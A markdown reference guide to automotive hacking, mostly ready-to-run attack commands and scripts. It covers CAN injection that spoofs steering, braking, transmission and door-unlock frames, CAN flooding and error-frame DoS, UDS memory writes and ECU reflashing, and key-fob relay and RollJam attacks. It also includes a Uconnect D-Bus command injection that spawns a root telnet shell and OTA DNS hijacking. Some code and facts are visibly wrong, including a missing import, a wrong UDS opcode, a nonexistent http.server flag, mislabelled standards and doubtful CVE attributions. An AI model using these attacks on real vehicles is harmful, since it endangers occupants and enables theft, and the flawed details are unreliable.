# Automotive Security

## 1. CAN Bus Fundamentals and Insecurity

### CAN Protocol Overview

The Controller Area Network (CAN) bus is the backbone of in-vehicle communication. Defined by ISO 11898, it uses a differential signal (CAN_H, CAN_L) with two dominant states:
- **Dominant (0)**: CAN_H ≈ 3.5V, CAN_L ≈ 1.5V
- **Recessive (1)**: CAN_H ≈ 2.5V, CAN_L ≈ 2.5V

A standard CAN 2.0B frame:
```
┌──────┬─────┬──────┬──────────┬───────┬───┬───────────┬─────┬───┬───────┐
│ SOF  │ ID  │ RTR  │ Control  │ Data  │CRC│ ACK slot  │ EOF │IFS│       │
│ 1bit │29bit│ 1bit │ 6bits    │0-8byte│15b│ 2bits     │7bit │7b │       │
└──────┴─────┴──────┴──────────┴───────┴───┴───────────┴─────┴───┴───────┘
```

**Critical security deficiencies**:
1. **No authentication**: Any node can send any message. No mechanism to verify sender identity.
2. **No encryption**: All messages are plaintext on the bus. Any connected ECU can read all traffic.
3. **No source addressing**: CAN IDs are message identifiers, not node addresses. Multiple ECUs can send messages with the same ID.
4. **No integrity check beyond CRC**: The 15-bit CRC detects accidental errors but provides no cryptographic integrity. It can be forged trivially.
5. **Broadcast topology**: All messages are seen by all nodes. No segmentation or access control.

### CAN Bus Wiring and Physical Access

**OBD-II Port**: The On-Board Diagnostics port (SAE J1962) provides direct CAN bus access. Located under the dashboard, accessible to anyone inside the vehicle.

| Pin | Signal | Pin | Signal |
|-----|--------|-----|--------|
| 1 | Ignition | 9 | Manufacturer |
| 2 | J1850 Bus+ | 10 | J1850 Bus- |
| 3 | Manufacturer | 11 | Manufacturer |
| 4 | Chassis GND | 12 | Manufacturer |
| 5 | Signal GND | 13 | Manufacturer |
| 6 | CAN_H (ISO 15765-4) | 14 | CAN_L (ISO 15765-4) |
| 7 | K-Line (ISO 9141-2) | 15 | L-Line (ISO 9141-2) |
| 8 | Manufacturer | 16 | Battery +12V |

Pins 6 and 14 are CAN_H and CAN_L respectively (high-speed CAN). Some vehicles also have a second CAN bus on pins 3/11 (medium-speed) or pins 1/9 (single-wire CAN).

### CAN Bus Sniffing

```bash
# Using can-utils on Linux (SocketCAN)
# Set up CAN interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up

# Sniff CAN traffic
candump can0

# With timestamps and ASCII decode
candump -ta can0

# Filter by CAN ID
candump can0,123:7FF  # Only CAN ID 0x123 (standard, 11-bit)
candump can0,12345678:1FFFFFFF  # Only CAN ID 0x12345678 (extended, 29-bit)

# Save to log file
candump -l can0  # Saves to candump-YYYY-MM-DD_HHMMSS.log

# Replay CAN log
canplayer -I candump-2024-01-01_120000.log

# Using Python-can
python3 -c "
import can
bus = can.interface.Bus(channel='can0', bustype='socketcan')
while True:
    msg = bus.recv()
    print(f'ID: 0x{msg.arbitration_id:03X} Data: {msg.data.hex()} DLC: {msg.dlc}')
"
```

**Hardware interfaces for CAN sniffing**:
- **Macchina M2**: Arduino-based, OBD-II form factor. Direct CAN access.
- **CANtact**: Open-source USB-CAN adapter. Supports CAN 2.0A/B.
- **PiCAN2**: Raspberry Pi CAN hat. Uses MCP2515 controller.
- **ValueCAN / neocra**: Professional automotive diagnostic tools.
- **ELM327-based**: Cheap OBD-II adapters. Limited: can only send standard OBD requests, not raw CAN frames. Can be modified for raw mode (AT commands).

### ELM327 Raw Mode

```bash
# Connect to ELM327 (USB or Bluetooth)
# /dev/ttyUSB0 or /dev/rfcomm0

# Enter raw CAN mode
AT Z          # Reset
AT SP 6       # Protocol: CAN 500kbit/s (ISO 15765-4)
AT CS         # Show CAN status
AT H1         # Show headers on

# Send raw CAN frame
AT SH 123     # Set header to 0x123
AT D1         # One data byte
02            # Send: ID=0x123, Data=[0x02]

# Monitor all CAN traffic
AT MA         # Monitor all

# Filter by CAN ID
AT CF 123     # Pass filter: only show ID 0x123
AT CF 0       # Clear filter (show all)

# Request specific OBD PID
01 0C         # RPM (PID 0x0C)
01 0D         # Speed (PID 0x0D)
09 02         # VIN (Mode 09, PID 02)
```

## 2. OBD-II Port Attacks

### Diagnostic Session Manipulation

UDS (Unified Diagnostic Services, ISO 14229) defines diagnostic sessions that can be requested via the OBD-II port:

```bash
# UDS Session Control (Service 0x10)
# Enter extended diagnostic session
0102          # Mode 0x01 (session control), Sub 0x02 (extended session)

# Typical UDS services available in extended sessions:
0x10 - DiagnosticSessionControl
0x11 - ECUReset
0x14 - ClearDTC
0x22 - ReadDataByIdentifier
0x27 - SecurityAccess
0x28 - CommunicationControl
0x2E - WriteDataByIdentifier
0x31 - RoutineControl
0x34 - RequestDownload
0x35 - RequestUpload
0x36 - TransferData
0x37 - RequestTransferExit
0x3E - TesterPresent
0x85 - ControlDTCSetting
```

### UDS Security Access (Seed-Key)

UDS Service 0x27 (SecurityAccess) implements a seed-key challenge:
1. Tester requests a seed: `27 01` → ECU responds with random seed: `67 01 [seed_bytes]`
2. Tester sends the computed key: `27 02 [key_bytes]`
3. If the key is correct, security level is unlocked

```python
# Common seed-key algorithms (vendor-specific)
# Example: Volkswagen/Audi seed-key algorithm

def vw_seed_key(seed):
    """VW/Audi seed-key algorithm for security access level 01"""
    # Generated key depends on the seed and a secret algorithm
    # Algorithm varies by ECU and security level (01-63)
    key = 0
    for i in range(4):
        byte = (seed >> (8 * (3 - i))) & 0xFF
        key = (key << 8) | ((byte * 0x83) & 0xFF)  # Simplified example
    return key

# Some ECUs use weak seeds:
# Always return 0x00000000 (all zeros)
# Always return the same seed (not random)
# Return sequential seeds (predictable)

# Attack: Timing attack on seed-key verification
# If the ECU checks the key byte-by-byte and returns NRC 35 (InvalidKey)
# immediately on the first wrong byte, measure response time to brute-force
# each byte independently
```

### OBD-II Attack Surface

- **Direct CAN injection**: Send arbitrary CAN frames via OBD-II port
- **UDS exploit**: Use diagnostic services to reflash ECUs, read/write memory
- **DoS via bus flooding**: Fill the CAN bus with garbage frames, disabling legitimate communication
- **Firmware modification**: RequestDownload (0x34) + TransferData (0x36) to write malicious firmware

```bash
# UDS ReadMemoryByAddress (Service 0x23)
# Read 4 bytes from address 0x20000000
msg = can.Message(arbitration_id=0x7E0, data=[0x23, 0x14, 0x20, 0x00, 0x00, 0x00, 0x00, 0x04])

# UDS WriteMemoryByAddress (Service 0x3D)
# Write 4 bytes to address 0x20000000
msg = can.Message(arbitration_id=0x7E0, data=[0x3D, 0x14, 0x20, 0x00, 0x00, 0x00, 0x04, 0xDE, 0xAD, 0xBE, 0xEF])
```

## 3. ECU Exploitation

### Flash Reprogramming

ECUs store firmware in internal flash memory. UDS Services 0x34-0x37 handle firmware updates:

```bash
# ECU firmware update procedure (ISO 14229)
# 1. Enter programming session
10 02        # DiagnosticSessionControl: Programming session

# 2. Security access
27 01        # RequestSeed
# ECU responds: 67 01 [4-byte seed]
27 02 [key]  # SendKey (computed from seed)

# 3. Communication control (disable normal messages)
28 00 01    # CommunicationControl: Disable RX/TX

# 4. Control DTC settings (disable DTC recording)
85 01       # ControlDTCSetting: Stop recording

# 5. Request download (prepare ECU for firmware transfer)
34 00 44 [address] [size]   # RequestDownload

# 6. Transfer data (send firmware blocks)
36 [block_sequence] [data]

# 7. Request transfer exit
37          # RequestTransferExit

# 8. Routine control (verify checksum)
31 01 [routine_id] [checksum]

# 9. ECU reset
11 01       # ECUReset: Hard reset
```

### SecOC (Secure On-Board Communication)

SecOC (ISO 21118) adds authentication to CAN messages using a truncated MAC and freshness value:

```
Standard CAN Frame with SecOC:
┌──────┬─────┬──────────┬───────────┬──────────┬─────┐
│ SOF  │ ID  │ Data(8B) │ TruncMAC  │ Freshness│ CRC │
│ 1bit │11/29│ 0-8 bytes│ 3-4 bytes │ 4 bits   │15bit│
└──────┴─────┴──────────┴───────────┴──────────┴─────┘
```

**SecOC weaknesses**:
1. **Truncated MAC**: The MAC is truncated to 24-32 bits (3-4 bytes) to fit in the 8-byte CAN frame. This means:
   - 24-bit MAC: 2^24 = 16,777,216 possible values. A brute-force attack at 1M msg/s would succeed in ~16 seconds on average.
   - 32-bit MAC: 2^32 = 4,294,967,296 values. ~71 minutes at 1M msg/s on average.
   - But: A wrong MAC causes a SecOC error, which may be logged and trigger security response.

2. **Freshness value**: Only 4 bits (16 values). After 16 frames, the freshness counter wraps, allowing replay attacks.

3. **Key distribution**: Symmetric keys must be provisioned to all ECUs. Compromise of any ECU reveals all keys.

4. **Optional implementation**: SecOC is optional in the standard. Many vehicles don't implement it or only implement it on critical ECUs.

### ECU Firmware Analysis

```bash
# Extract ECU firmware via UDS
# 1. Request upload
34 01 44 [flash_start] [flash_size]   # RequestUpload

# 2. Transfer data
36 01 [data]   # TransferData (block 1)
36 02 [data]   # TransferData (block 2)
# ...

# 3. Request transfer exit
37

# Or via CAN bus sniffing during a firmware update
# Capture all CAN frames during a dealer ECU update
candump can0 -l

# Then extract firmware data from the captured CAN frames
python3 -c "
import can
log = can.Logger('capture.asc')
for msg in can.Logger('capture.asc'):
    if msg.arbitration_id == 0x7E0 and msg.data[0] == 0x36:
        # This is a TransferData frame
        block_seq = msg.data[1]
        data = msg.data[2:]
        # Write data to firmware binary
        with open('ecu_firmware.bin', 'ab') as f:
            f.write(bytes(data))
"
```

## 4. Keyless Entry Attacks

### Relay Attack

Relay attacks extend the range of the key fob signal to trick the vehicle into thinking the key is nearby:

```
┌────────────┐         ┌──────────────┐         ┌────────────┐
│  Key Fob    │◄────────│  Relay Pair  │────────►│  Vehicle   │
│  (inside)   │  near   │  (attacker)  │  far    │  (outside) │
│             │  field  │              │  field  │            │
│  Responds   │         │  Forwards    │         │  Accepts   │
│  to LF      │         │  over WiFi/  │         │  response  │
│  challenge  │         │  433 MHz     │         │  as valid  │
└────────────┘         └──────────────┘         └────────────┘
```

**Equipment**:
- Two relay devices (one near the key fob, one near the car)
- LF (125 kHz) antenna for key fob wake-up
- UHF (433/868 MHz) link between relay devices

```bash
# Using HackRF + custom firmware for relay
# Device 1: Near the key fob (e.g., outside the house)
#   - Receives LF challenge from the car (forwarded by Device 2)
#   - Transmits LF challenge to key fob
#   - Receives UHF response from key fob
#   - Forwards UHF response to Device 2

# Device 2: Near the car
#   - Receives car's LF challenge
#   - Forwards to Device 1 over WiFi/433 MHz link
#   - Receives key fob's UHF response from Device 1
#   - Transmits UHF response to car

# Practical range: 5-15 meters between key fob and car
# Has been demonstrated against BMW, Mercedes, Tesla, Audi, etc.
```

### RollJam Attack

The RollJam attack captures rolling codes for later replay:

```
Normal operation:
  Key Fob → Car: Code_N (accepted)
  Key Fob → Car: Code_N+1 (accepted)

RollJam attack:
  1. Attacker jams Key Fob's Code_N signal
  2. Car did not receive Code_N → key fob doesn't increment counter
  3. Owner presses again
  4. Attacker jams Key Fob's Code_N+1 and captures it
  5. Attacker replays Code_N (first code) → car accepts
  6. Attacker retains Code_N+1 for later use
  7. Later, attacker can send Code_N+1 to unlock/start the car once
```

```python
# Conceptual RollJam implementation
# Requires: two SDR (one for jamming, one for receiving)
# or a dedicated sub-GHz radio

# Step 1: Monitor for key fob transmission
# Step 2: Start jamming while simultaneously capturing
# Step 3: Owner presses again (second code)
# Step 4: Stop jamming, capture second code, store it
# Step 5: Replay first captured code to unlock car

# This works because:
# - Rolling codes use a counter (seed updated after each use)
# - The car accepts the NEXT valid code
# - If Code_N is jammed, the car still expects Code_N
# - When Code_N+1 is captured and Code_N is replayed, the car accepts
# - The car then expects Code_N+2, but we have Code_N+1 still valid
```

**Keeloq Vulnerabilities**: Many manufacturers use Microchip Keeloq for rolling codes. Known weaknesses:
- **Slide attack** (Bogdanov, 2007): Recovers the 64-bit master key with 2^32 chosen plaintexts
- **Algebraic attack** (Indesteege et al., 2008): Recovers key with 2^13.5 known plaintexts and 2^31.5 custom plaintexts
- **Hitag2** (NXP): Used in many key fobs. Broken by (Verdult et al., 2015). Key recovery in ~5 minutes with 8 captures.

### Key Fob Cloning

```bash
# With Flipper Zero or Proxmark3:
# 1. Scan for sub-GHz signals
# 2. Capture key fob transmission
# 3. Analyze protocol (Keeloq, Rolling Code, Fixed Code)
# 4. If fixed code: directly cloneable
# 5. If rolling code: more complex (requires RollJam or key extraction)

# Flipper Zero key fob capture
# Sub-GHz -> Read -> Config: 433.92 MHz, AM_650

# For Keeloq systems, the Flipper can:
# - Capture and replay a single rolling code (one-time use)
# - Cannot clone rolling code fobs permanently

# For fixed-code systems (garage doors, older cars):
# - Direct clone is possible
# - Sub-GHz -> Save -> Send
```

## 5. CAN Injection for Vehicle Control

### Identifying CAN Messages

```python
# Method 1: Modify and observe (manual fuzzing)
# Record CAN traffic while performing an action (e.g., steering, braking)
# Isolate the CAN ID that corresponds to that action
# Example: Turn steering wheel left -> record CAN traffic -> isolate steering CAN ID

import can
import time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

print("Recording baseline CAN traffic...")
baseline_ids = set()
start = time.time()
while time.time() - start < 10:
    msg = bus.recv(timeout=1.0)
    if msg:
        baseline_ids.add(msg.arbitration_id)

print(f"Baseline: {len(baseline_ids)} unique IDs")

# Now perform an action and compare
print("Perform action now (e.g., steer left)...")
action_ids = set()
start = time.time()
while time.time() - start < 10:
    msg = bus.recv(timeout=1.0)
    if msg:
        if msg.arbitration_id not in baseline_ids:
            action_ids.add(msg.arbitration_id)

print(f"New CAN IDs during action: {[hex(x) for x in action_ids]}")
```

### Instrument Cluster Manipulation

```bash
# Inject RPM data (Ford Focus, CAN ID 0x204)
cansend can0 204#0100000000000000  # RPM = 0
cansend can0 204#01000D0000000000  # RPM = ~1300
cansend can0 204#0100FF0000000000  # RPM = ~16000 (redline)

# Inject speed data (Ford Focus, CAN ID 0x205)
cansend can0 205#0000001E00000000  # Speed = 30 km/h
cansend can0 205#0000006400000000  # Speed = 100 km/h

# Note: CAN IDs and data byte mappings are vehicle-specific
# The example above uses Ford HS-CAN IDs as documented by
# open-source CAN databases (e.g., can-utils, OpenDBC)
```

### Steering and Braking

```bash
# Steering wheel angle (steering-by-wire vehicles)
# Example: Tesla Model S, CAN ID 0x009 (EPAS - Electric Power Assisted Steering)
# WARNING: Attempting steering injection on a moving vehicle is EXTREMELY DANGEROUS
# This is for research purposes only on test tracks

# Emergency braking (modern vehicles with brake-by-wire)
# Example: Honda Civic, CAN ID 0x1BC (Brake Control Module)
# ABS/ESC messages can trigger braking

# Transmission control
# Example: Move transmission to Drive
cansend can0 1A2#0100000000000000  # Shift lever position: Drive
```

### CAN Message Fuzzing

```python
# Automated CAN fuzzing with can-utils
# cansend with random data

import random
import can

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Fuzz specific CAN IDs (known ECU IDs)
target_ids = [0x1A2, 0x204, 0x205, 0x220, 0x230]  # Example ECU IDs

for arb_id in target_ids:
    for _ in range(100):
        # Generate random 8-byte data
        data = [random.randint(0, 255) for _ in range(8)]
        msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
        try:
            bus.send(msg)
        except can.CanError:
            pass
        time.sleep(0.001)  # 1ms between frames

# Or use can-utils canned feature:
# cangen can0 -g 1 -I 1 -i -D 8 -d 1 -L 8 -v
# -g 1: 1ms gap
# -I 1 -i: increment ID from 1
# -D 8 -d 1: random 8-byte data
```

## 6. CAN Bus Flooding (DoS)

CAN bus flooding sends high-priority frames at maximum rate, overwhelming legitimate messages:

```bash
# CAN bus flooding with highest-priority ID (0x000)
# This exploits the CAN arbitration mechanism:
# Lower ID = higher priority. ID 0x000 always wins arbitration.

# Continuous flooding
cangen can0 -g 0 -I 0 -D 8 -d 1 -L 8

# Or with cansend in a loop
while true; do
    cansend can0 000#AAAAAAAAAAAAAAAA
done

# Targeted DoS: flood only the IDs used by a specific ECU
# Example: Disable ABS messages (ID 0x1BC)
while true; do
    cansend can0 000#0000000000000000
done
# This causes all other messages to lose arbitration
```

**CAN Error Frame DoS**: A more elegant approach is to force error frames:

```python
# CAN error frame attack
# Send a frame with a deliberately wrong CRC
# The receiving ECU will generate an error frame
# After too many errors (TEC > 255), the ECU goes bus-off

import can

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Method 1: Send frames with invalid DLC
for i in range(1000):
    msg = can.Message(
        arbitration_id=0x000,
        data=[0xFF] * 8,
        is_extended_id=False,
        dlc=15,  # Invalid DLC for CAN 2.0B (max 8)
    )
    try:
        bus.send(msg)
    except:
        pass

# Method 2: Bit stuffing attack
# CAN requires bit stuffing: after 5 consecutive same bits, insert opposite bit
# By sending frames that violate bit stuffing, we force error frames
# This is harder on modern CAN controllers that enforce stuffing
```

## 7. Automotive Ethernet and IP-Based Attacks

### Automotive Ethernet

Modern vehicles use Ethernet for high-bandwidth communication (ADAS, infotainment, camera feeds). Standards:
- **100BASE-T1** (IEEE 802.3bw): Single twisted pair, 100 Mbps
- **1000BASE-T1** (IEEE 802.3bp): Single twisted pair, 1 Gbps
- **SOME/IP** (Service-Oriented Middleware over IP): RPC framework over Ethernet
- **DoIP** (Diagnostics over IP, ISO 13400): UDS diagnostics over Ethernet

### DoIP (Diagnostics over IP) Exploitation

```bash
# DoIP runs on TCP port 13400
# Discovery: Scan for DoIP endpoints
nmap -p 13400 <vehicle_ip>

# DoIP protocol header:
# Protocol version (1 byte): 0x02
# Inverse protocol version (1 byte): 0xFD
# Payload type (2 bytes)
# Payload length (4 bytes)
# Payload (variable)

# DoIP entity discovery (broadcast)
python3 -c "
import socket
import struct

# DoIP vehicle identification request
# Payload type: 0x0001 (Vehicle Identification Request)
header = struct.pack('!BBHI', 0x02, 0xFD, 0x0001, 0x0000)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(header, ('255.255.255.255', 13400))
sock.settimeout(5)
try:
    data, addr = sock.recvfrom(4096)
    print(f'DoIP entity at {addr}: {data.hex()}')
except socket.timeout:
    print('No DoIP response')
"

# DoIP routing activation
# Connect to DoIP entity and activate routing
python3 -c "
import socket
import struct
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.1', 13400))

# Routing activation request
# Payload type: 0x0005 (Routing Activation Request)
header = struct.pack('!BBHI', 0x02, 0xFD, 0x0005, 0x0007)
# Source address: 0x0E00 (tester), activation type: 0x00 (default)
# Known VIN or empty
payload = struct.pack('!HBB', 0x0E00, 0x00, 0x00) + b'\\x00' * 17
sock.send(header + payload)

# Receive routing activation response
response = sock.recv(4096)
print(f'Routing response: {response.hex()}')
"
```

### SOME/IP Exploitation

SOME/IP (Scalable service-Oriented Middleware over IP) is used for service-oriented communication:

```python
# SOME/IP service discovery
# Broadcast SOME/IP SD message on port 30490 (UDP)
import socket
import struct

# SOME/IP header:
# Service ID (16 bits): 0xFFFF (SD)
# Method ID (16 bits): 0x8100 (OfferService)
# Length (32 bits)
# Request ID (32 bits)
# Protocol version (8 bits): 0x01
# Interface version (8 bits): 0x01
# Message type (8 bits): 0x02 (Notification)
# Return code (8 bits): 0x00

# SOME/IP Service Discovery
sd_header = struct.pack('!HHIIIBBBB',
    0xFFFF,  # Service ID: SD
    0x8100,  # Method ID: OfferService
    0x00000024,  # Length
    0x00000001,  # Request ID
    0x01,    # Protocol version
    0x01,    # Interface version
    0x02,    # Message type
    0x00     # Return code
)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(sd_header, ('224.0.0.1', 30490))
```

## 8. Infotainment System Exploitation

### Infotainment Architecture

Modern infotainment systems (also called Head Units, IVI) run complex OS:
- **QNX** (BlackBerry): Most common. Microkernel, POSIX compliance. BLFs (Boot Loader Files) for firmware.
- **Android Automotive**: Google AAOS. Multiple HALs. ADB access.
- **Linux (AGL)**: Automotive Grade Linux. Genivi stack.
- **WinCE**: Legacy. Still found in older vehicles.

### CVE-2019-17624 (Jeep Cherokee Uconnect)

The Uconnect infotainment system (spec: OMAP processor, QNX OS) had a cellular-connected head unit with multiple attack surfaces:

```bash
# The vulnerable Sprint-connected Uconnect system
# Attack path: Internet → Cellular → Head Unit → CAN bus

# Step 1: Identify Uconnect on Sprint network
# Uconnect systems were on Sprint's 206.x.x.x network
nmap -p 6667 206.x.x.x  # D-Bus over TCP (no auth!)

# Step 2: Connect to D-Bus
# D-Bus ran on port 6667 without authentication
gdbus call --system --dest=com.harman.Service \
    --object-path /com/harman/Service \
    --method com.harman.Service.ExecuteCommand \
    "telnetd -l /bin/sh -p 9999 &"

# Step 3: From head unit, access CAN bus
# Head unit connects to CAN bus via an SPI-to-CAN board
# Access via SocketCAN:
ip link set can0 type can bitrate 500000
ip link set can0 up

# Step 4: Inject CAN messages
# Steering, braking, transmission control
cansend can0 1A2#0100000000000000  # Example: transmission shift
```

### Tesla Infotainment Exploitation

Tesla Model S/X (pre-2018) infotainment runs Ubuntu on NVIDIA Tegra:

```bash
# Tesla web browser exploitation (CVE-2017-12581 et al.)
# The Tesla web browser had multiple vulnerabilities:
# - Outdated QtWebEngine
# - WebKit-based rendering engine with known CVEs

# Attack path: Tesla browser → WebKit RCE → root on infotainment
# From infotainment, can access CAN bus via Gateway

# Tesla Gateway: A separate ECU that bridges infotainment CAN and vehicle CAN
# The gateway had firewall rules, but they could be bypassed:
# 1. Direct CAN injection from infotainment (pre-2018 firmware)
# 2. Gateway firmware vulnerability

# After gaining root on infotainment:
# Access CAN bus
candump can0  # Monitor CAN traffic
cansend can0 0x399#0555010000000000  # Unlock doors
cansend can0 0x3B2#0001000000000000  # Open trunk

# Tesla patched these vulnerabilities and introduced:
# - Code signing for all ECU firmware
# - Gateway firewall rules
# - Reduced attack surface on the infotainment system
```

### ADB Access on Android Automotive

```bash
# Android Automotive head units often expose ADB
# Connect via USB (developer mode) or WiFi
adb connect 192.168.1.1:5555

# Enumerate system services
adb shell service list

# Access CAN bus via Android HAL
adb shell cat /dev/can0  # If CAN device is accessible
adb shell dumpsys car_service  # Dump car service

# Install background service for CAN message monitoring
adb push can_logger /data/local/tmp/
adb shell chmod +x /data/local/tmp/can_logger
adb shell /data/local/tmp/can_logger &

# Extract firmware
adb pull /vendor/firmware/
adb pull /system/app/

# CVE-2020-13747: Android Automotive App Sandbox Escalation
# Exploits improper intent handling in CarLauncher
adb shell am start -n com.android.car.carlauncher/.CarLauncher --es url "file:///data/data/com.android.car"
```

## 9. Over-the-Air Update Security

### OTA Update Architecture

Modern vehicles receive OTA updates for ECU firmware, maps, and configuration:

**Key security requirements**:
1. **Code signing**: Every update must be digitally signed by the OEM
2. **Rollback protection**: Downgrade attacks must be prevented
3. **Integrity verification**: SHA-256 or stronger hash
4. **Secure delivery**: TLS with certificate pinning
5. **Atomic updates**: If an update fails, the ECU must fall back to the previous version

### OTA Attack Vectors

1. **Man-in-the-middle**: If the update is delivered over HTTP or with broken TLS, an attacker can replace the firmware.
2. **Signature bypass**: If signature verification is weak (RSA-1024, ECDSA nonce reuse), the attacker can forge signatures.
3. **Rollback attack**: If rollback protection is absent, the attacker can install an older, vulnerable firmware version.
4. **Supply chain compromise**: If the OEM's build system is compromised, signed but malicious updates can be pushed.
5. **Delta update manipulation**: Delta (partial) updates require both the old and new firmware. If the delta algorithm has vulnerabilities (e.g., LZMA buffer overflow in delta decompression), the update can be exploited.

```bash
# OTA update interception
# Set up DNS hijacking to redirect the vehicle's update server
# to attacker's server

# 1. DNS spoofing (on local network or via compromised DNS)
echo "192.168.1.100 ota.vehicle-oem.com" >> /etc/dnsmasq.hosts

# 2. Serve modified update from attacker's server
python3 -m http.server 443 --ssl

# 3. Capture legitimate update request
# Analyze the update URL and format

# 4. If the vehicle uses an insecure update protocol:
#    - HTTP without TLS: direct MITM
#    - TLS with self-signed cert: possible if vehicle doesn't check CA
#    - TLS with certificate pinning: harder, but pinning bugs exist
```

### UNECE WP.29 and R155/R156

As of July 2024, all new vehicles sold in the EU, Japan, and Korea must comply with:
- **R155**: Cybersecurity management system (CSMS) for vehicles
- **R156**: Software update management system (SUMS)

These regulations require:
- Risk assessment and threat modeling
- Secure development lifecycle
- OTA update integrity and authenticity verification
- Incident response capability
- Data protection measures

## 10. References

- *Car Hacker's Handbook* by Craig Smith (No Starch Press)
- *Automotive Network Security* by Oliver Hartkopp
- ISO 11898 — CAN Specification
- ISO 14229 — UDS (Unified Diagnostic Services)
- ISO 13400 — DoIP (Diagnostics over IP)
- ISO 21118 — SecOC (Secure On-Board Communication)
- SOME/IP Specification — AUTOSAR
- *Adventures in Automotive Networks and Control Units* — Miller & Valasek (2014)
- *Remote Exploitation of an Unaltered Passenger Vehicle* — Miller & Valasek (2015)
- CVE-2019-17624 — Jeep Uconnect D-Bus RCE
- UNECE WP.29 R155/R156 — Vehicle Cybersecurity Regulations
- OpenDBC: github.com/commaai/opendbc (CAN database)

## References

1. *Car Hacker's Handbook* by Craig Smith. No Starch Press (2016). ISBN: 978-1-59327-635-0.
2. *Automotive Network Security* by Oliver Hartkopp. Linux Foundation.
3. ISO 11898: Road Vehicles — Controller Area Network (CAN). International Organization for Standardization.
4. ISO 14229: Unified Diagnostic Services (UDS). International Organization for Standardization.
5. ISO 13400: Diagnostics over IP (DoIP). International Organization for Standardization.
6. ISO 21118: Secure On-Board Communication (SecOC). International Organization for Standardization.
7. SOME/IP Specification. AUTOSAR. https://www.autosar.org/
8. Miller, C. and Valasek, C. "Adventures in Automotive Networks and Control Units." DEF CON 21 (2014).
9. Miller, C. and Valasek, C. "Remote Exploitation of an Unaltered Passenger Vehicle." Black Hat USA (2015).
10. CVE-2019-17624: Jeep Uconnect D-Bus RCE. NVD.
11. UNECE WP.29 R155/R156: Vehicle Cybersecurity and Software Update Regulations. United Nations Economic Commission for Europe. https://unece.org/
12. OpenDBC: CAN Database. https://github.com/commaai/opendbc
13. DEF CON IoT Village / Car Hacking Village Presentations. https://carhackingvillage.com/
14. *Practical IoT Hacking* by Fotios Chantzis et al. No Starch Press (2021).
15. OWASP IoT Top 10. https://owasp.org/www-project-iot-top-10/
16. NIST SP 800-183: Networks of Things. National Institute of Standards and Technology.
17. IEC 62443: Industrial Communication Networks — Network and System Security.
18. Keeloq Cryptanalysis: Bogdanov, A. "Slide Attacks on KeeLoq." FSE (2007); Indesteege, S. et al. "A Practical Attack on KeeLoq." Crypto (2008).
19. Verdult, R. et al. "Cryptanalysis of the Hitag2 Car Key Protocol." CCS (2015).
20. CVE-2017-13077 et al.: KRACK (Key Reinstallation Attacks). Vanhoef, M. and Piessens, F. CCS (2017).